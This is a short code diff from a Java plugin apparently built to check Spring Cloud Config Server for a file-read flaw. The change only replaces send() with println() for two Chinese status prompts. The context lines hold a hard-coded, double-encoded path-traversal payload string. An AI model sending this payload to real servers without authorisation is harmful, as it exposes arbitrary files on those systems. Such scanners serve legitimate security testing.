@@ -21,8 +21,8 @@ public class SpringCloudServerConfigFileRead extends WebSocketPlugin {
     public static String payload = "/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..";
     @Override
     public boolean check(Map param) {
-        send("[!] 请等待，正在检测...");
-        send("请输入url");
+        println("[!] 请等待，正在检测...");
+        println("请输入url");
         String input = getInput();
         HttpResponse httpResponse = null;
         try {
